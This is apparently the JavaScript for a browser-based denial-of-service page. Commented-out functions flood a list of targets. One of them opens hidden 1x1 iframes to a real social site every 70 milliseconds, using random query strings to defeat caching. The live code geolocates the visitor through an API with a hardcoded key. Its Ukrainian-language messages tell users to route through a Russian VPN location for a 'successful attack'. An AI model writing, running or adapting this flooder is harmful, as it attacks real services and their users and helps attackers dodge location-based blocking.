// function startFlood(targets) {
//     Object.values(targets).forEach(target => {
//         if (target.isCanceled) {
//         return;
//         }

//         if (target.valid) {
//         flood(target);
//         } else {
//         delay(1000).then(() => startFlood([target]));
//         }
//     });
// }

// function validateTargets(targets) {
//     const promises = Object.values(targets).map(target => validateTarget(target));

//     return Promise.all(promises);
// }

// async function validateTarget(target) {
//     for (let retries = 0; retries < CONSTANTS.RETRIES_LIMIT; retries++) {
//         await fetchWithTimeout(target.uri, {timeout: CONSTANTS.VALIDATION_TIMEOUT, method: 'GET'})
//         .then(() => {
//             target.valid = true
//         })
//         .catch(() => {
//             target.valid = false;
//         });

//         if (target.valid) {
//         return;
//         }
//     }

//     target.isCanceled = true;
// }

const currentCountry = document.querySelector(".country")

async function checkUserLocation() {
    const country = await getUserCountry();
    if (country === "") {
        currentCountry.innerHTML = "Визначаємо Вашу країну... Для успішної атаки рекомендуємо використати VPN! Та обрати локацію Росія."
        setTimeout(function(){
            checkUserLocation()
        }, 5000)
        return
    }
    
    if (country === "Ukraine") {
        currentCountry.innerHTML = '<p>Ви запустили цю сторінку з України. Для успішної атаки рекомендуємо використати VPN!</p>'
    } else if (country === "Russian Federation") {
        currentCountry.innerHTML = '<p>Супер! Вашу локацію визначено як Росія. Можна починати!</p>'
    } else {
        currentCountry.innerHTML = `<p>Вашу локацію визначено як "${country}". Для максимального ефекту потрібно заходити з локації - Росія.</p>`
    }
}

function getUserCountry() {
    // return fetch('https://api.ipregistry.co/?key=tryout')
    return fetch('https://api.ipregistry.co/?key=t6zpigq4l4t7j1ig')
        .then(function (response) {
            return response.json()
        })
        .then(function (payload) {
            return payload.location.country.name
        })
        .catch(() => '')
}

checkUserLocation()







// let inProgress = false;
//         let interval;
//         let iframeIndex = 1;
//         let count = 0;

//         const TARGET = 'https://ok.ru';

//         function getRandomArbitrary(min, max) {
//             return Math.random() * (max - min) + min;
//         }

//         function generateRandomSalt() {
//             const now = (new Date()).getTime();
//             return '?' + now + getRandomArbitrary(0, 100000);
//         }

//         function getTarget() {
//             const salt = generateRandomSalt();

//             return TARGET + salt;
//         }

//         function drawIframe(block, target, id) {
//             $('<iframe>', {
//                 src: target,
//                 id: 'frame' + id,
//                 frameborder: 0,
//                 width: 1,
//                 height: 1,
//             }).appendTo(block);
//         }

//         function start() {
//             const frameBlock = $('#frames');

//             interval = setInterval(() => {
//                 const target = getTarget();
//                 console.log(target);
//                 drawIframe(frameBlock, target, iframeIndex);
//                 iframeIndex++;
//                 count++;
//                 if (iframeIndex > 200) {
//                     clearFrames();
//                     iframeIndex = 1;
//                 }
//             }, 70);
//         }

//         function clearFrames() {
//             $('#frames').empty();
//         }

//         function stop() {
//             clearInterval(interval);
//             clearFrames();
//         }

//         $(document).ready(function () {
//             const counterBlock = $('#counter');
//             setInterval(() => {
//                 counterBlock.text(count);
//             }, 1000)
//             $('#start')
//                 .on('click', function (e) {
//                     e.preventDefault();
//                     inProgress = !inProgress;
//                     $(this).text((inProgress) ? 'СТОП' : 'СТАРТ');
//                     if (inProgress) {
//                         start();
//                     } else {
//                         stop();
//                     }
//                 })
//         });